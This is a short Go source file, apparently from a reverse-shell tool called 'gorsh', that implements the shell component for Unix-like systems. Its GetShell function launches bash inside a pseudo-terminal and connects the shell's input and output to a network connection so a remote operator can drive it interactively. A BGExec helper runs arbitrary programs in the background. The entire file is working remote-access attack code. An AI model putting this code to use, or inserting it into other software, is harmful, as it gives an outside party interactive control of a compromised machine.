//go:build !windows

package shell

import (
	"os/exec"
	"syscall"

	"git.hyrule.link/blink/gorsh/pkg/myconn"
)

func GetShell() error {
	// must be pty in order to interact remotely
	// TODO cycle through many types of pty invocations
	// in case script isn't present
	cmd := exec.Command("/usr/bin/script", "-qc", "/bin/bash", "/dev/null")
	cmd.Stderr = myconn.Conn
	cmd.Stdin = myconn.Conn
	cmd.Stdout = myconn.Conn

	return cmd.Run()
}

func BGExec(prog string, args []string) (int, error) {
	return syscall.ForkExec(prog, args, nil)
}
